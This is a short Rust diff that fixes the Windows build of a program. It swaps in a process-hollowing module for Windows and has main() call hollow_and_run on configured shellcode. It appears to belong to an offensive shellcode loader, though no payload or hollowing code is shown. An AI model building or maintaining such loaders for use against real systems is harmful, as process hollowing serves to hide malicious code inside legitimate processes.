@@ -8,9 +8,9 @@ mod rco_process_hollowing_linux;
 use rco_process_hollowing_linux::hollow_and_run;
 
 #[cfg(windows)]
-mod rco_process_hollowing_linux;
+mod rco_process_hollowing_windows;
 #[cfg(windows)]
-use rco_process_hollowing_linux::hollow_and_run;
+use rco_process_hollowing_windows::hollow_and_run;
 
 fn main() {
     hollow_and_run(config::SHELLCODE);
